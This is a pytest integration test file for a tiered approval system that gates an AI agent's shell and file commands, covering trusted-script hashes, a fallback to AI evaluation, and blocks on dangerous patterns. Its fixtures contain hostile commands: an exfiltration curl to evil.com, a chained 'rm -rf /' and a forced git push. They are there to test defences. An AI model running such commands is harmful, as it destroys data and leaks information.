"""
Integration tests for Tier 2.5 within the full _evaluate_tiers pipeline.

Verifies that trusted scripts are approved at tier2_5_trusted_script,
that hash mismatches fall through to Tier 3, and that Tier 1 still
catches dangerous patterns even when a script is trusted.
"""

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest

from phlegyas.tier2_5_trust import ScriptTrustStore

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def trust_store_path(tmp_path: Path) -> Path:
    """Temporary path for the trust store JSON file."""
    return tmp_path / "trusted-scripts.json"


@pytest.fixture
def sample_script(tmp_path: Path) -> Path:
    """A real shell script file on disk."""
    script = tmp_path / "deploy.sh"
    script.write_text("#!/bin/bash\necho 'deploying'\n")
    return script


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_mock_evaluation(decision="approve", confidence=0.9, reasoning="Looks safe"):
    """Create a mock EvaluationResult for Tier 3 AI."""
    evaluation = MagicMock()
    evaluation.confidence = confidence
    evaluation.reasoning = reasoning
    return decision, evaluation


# ---------------------------------------------------------------------------
# Tests: Trusted script approved at Tier 2.5
# ---------------------------------------------------------------------------


@pytest.mark.integration
@pytest.mark.asyncio
async def test_trusted_script_approved_at_tier2_5(
    trust_store_path: Path,
    sample_script: Path,
    mock_env_vars,
):
    """A trusted script should be approved at tier2_5_trusted_script via _evaluate_tiers."""
    from phlegyas.approver_mcp import _evaluate_tiers, state

    # Set up a trust store with our sample script
    trust_store = ScriptTrustStore(store_path=trust_store_path)
    trust_store.trust(str(sample_script))

    # Patch state.trust_store to use our temp-backed store
    original_trust_store = state.trust_store
    state.trust_store = trust_store
    try:
        result = await _evaluate_tiers("Bash", {"command": str(sample_script)})

        assert result.tier == "tier2_5_trusted_script"
        assert result.decision == "allow"
        assert result.reason == "trusted_script"
    finally:
        state.trust_store = original_trust_store


# ---------------------------------------------------------------------------
# Tests: Modified script falls through to Tier 3
# ---------------------------------------------------------------------------


@pytest.mark.integration
@pytest.mark.asyncio
async def test_modified_script_falls_through_to_tier3(
    trust_store_path: Path,
    sample_script: Path,
    mock_env_vars,
):
    """A script with a changed hash should fall through to Tier 3 AI evaluation."""
    from phlegyas.approver_mcp import _evaluate_tiers, state

    # Trust the script, then modify it
    trust_store = ScriptTrustStore(store_path=trust_store_path)
    trust_store.trust(str(sample_script))
    sample_script.write_text("#!/bin/bash\ncurl http://example.com\n")

    # Mock the AI evaluator to avoid real API calls
    mock_evaluator = AsyncMock()
    mock_evaluator.evaluate = AsyncMock(
        return_value=_make_mock_evaluation("approve", 0.85, "Seems harmless")
    )

    original_trust_store = state.trust_store
    original_ai_evaluator = state.ai_evaluator
    state.trust_store = trust_store
    state.ai_evaluator = mock_evaluator
    try:
        result = await _evaluate_tiers("Bash", {"command": str(sample_script)})

        # Should have fallen through to Tier 3
        assert result.tier == "tier3_ai_approve"
        assert result.decision == "allow"
        mock_evaluator.evaluate.assert_called_once()
    finally:
        state.trust_store = original_trust_store
        state.ai_evaluator = original_ai_evaluator


@pytest.mark.integration
@pytest.mark.asyncio
async def test_modified_script_denied_by_tier3(
    trust_store_path: Path,
    sample_script: Path,
    mock_env_vars,
):
    """A modified trusted script denied by Tier 3 should return tier3_ai_deny."""
    from phlegyas.approver_mcp import _evaluate_tiers, state

    trust_store = ScriptTrustStore(store_path=trust_store_path)
    trust_store.trust(str(sample_script))
    sample_script.write_text("#!/bin/bash\ncurl http://evil.com/exfil\n")

    mock_evaluator = AsyncMock()
    mock_evaluator.evaluate = AsyncMock(
        return_value=_make_mock_evaluation("deny", 0.15, "Suspicious exfiltration")
    )

    original_trust_store = state.trust_store
    original_ai_evaluator = state.ai_evaluator
    state.trust_store = trust_store
    state.ai_evaluator = mock_evaluator
    try:
        result = await _evaluate_tiers("Bash", {"command": str(sample_script)})

        assert result.tier == "tier3_ai_deny"
        assert result.decision == "deny"
    finally:
        state.trust_store = original_trust_store
        state.ai_evaluator = original_ai_evaluator


# ---------------------------------------------------------------------------
# Tests: Tier 1 still blocks dangerous content even when script is trusted
# ---------------------------------------------------------------------------


@pytest.mark.integration
@pytest.mark.asyncio
async def test_tier1_blocks_dangerous_even_if_script_trusted(
    trust_store_path: Path,
    sample_script: Path,
    mock_env_vars,
):
    """Tier 1 should catch dangerous patterns before Tier 2.5 can approve."""
    from phlegyas.approver_mcp import _evaluate_tiers, state

    trust_store = ScriptTrustStore(store_path=trust_store_path)
    trust_store.trust(str(sample_script))

    # Command appends a dangerous operation after the trusted script
    dangerous_command = f"{sample_script} && rm -rf /"

    original_trust_store = state.trust_store
    state.trust_store = trust_store
    try:
        result = await _evaluate_tiers("Bash", {"command": dangerous_command})

        assert result.tier == "tier1_dangerous"
        assert result.decision == "deny"
    finally:
        state.trust_store = original_trust_store


@pytest.mark.integration
@pytest.mark.asyncio
async def test_tier1_blocks_force_push_even_with_trusted_script(
    trust_store_path: Path,
    sample_script: Path,
    mock_env_vars,
):
    """Tier 1 blocks git push --force even if a trusted script precedes it."""
    from phlegyas.approver_mcp import _evaluate_tiers, state

    trust_store = ScriptTrustStore(store_path=trust_store_path)
    trust_store.trust(str(sample_script))

    dangerous_command = f"{sample_script} && git push --force origin main"

    original_trust_store = state.trust_store
    state.trust_store = trust_store
    try:
        result = await _evaluate_tiers("Bash", {"command": dangerous_command})

        assert result.tier == "tier1_dangerous"
        assert result.decision == "deny"
    finally:
        state.trust_store = original_trust_store


# ---------------------------------------------------------------------------
# Tests: Non-Bash tools skip Tier 2.5 entirely
# ---------------------------------------------------------------------------


@pytest.mark.integration
@pytest.mark.asyncio
async def test_non_bash_tool_skips_tier2_5(
    trust_store_path: Path,
    mock_env_vars,
):
    """Non-Bash tools should skip Tier 2.5 and go to Tier 2 or Tier 3."""
    from phlegyas.approver_mcp import _evaluate_tiers, state

    trust_store = ScriptTrustStore(store_path=trust_store_path)

    original_trust_store = state.trust_store
    state.trust_store = trust_store
    try:
        # Read tool is safe at Tier 2
        result = await _evaluate_tiers("Read", {"file_path": "/some/file.py"})
        assert result.tier == "tier2_safe"
        assert result.decision == "allow"
    finally:
        state.trust_store = original_trust_store


# ---------------------------------------------------------------------------
# Tests: No AI evaluator falls through gracefully
# ---------------------------------------------------------------------------


@pytest.mark.integration
@pytest.mark.asyncio
async def test_modified_script_no_ai_evaluator(
    trust_store_path: Path,
    sample_script: Path,
    mock_env_vars,
):
    """Modified script with no AI evaluator should return tier3_no_ai."""
    from phlegyas.approver_mcp import _evaluate_tiers, state

    trust_store = ScriptTrustStore(store_path=trust_store_path)
    trust_store.trust(str(sample_script))
    sample_script.write_text("#!/bin/bash\nsomething different\n")

    original_trust_store = state.trust_store
    original_ai_evaluator = state.ai_evaluator
    state.trust_store = trust_store
    state.ai_evaluator = None
    try:
        result = await _evaluate_tiers("Bash", {"command": str(sample_script)})

        assert result.tier == "tier3_no_ai"
        assert result.decision == "no_ai"
    finally:
        state.trust_store = original_trust_store
        state.ai_evaluator = original_ai_evaluator
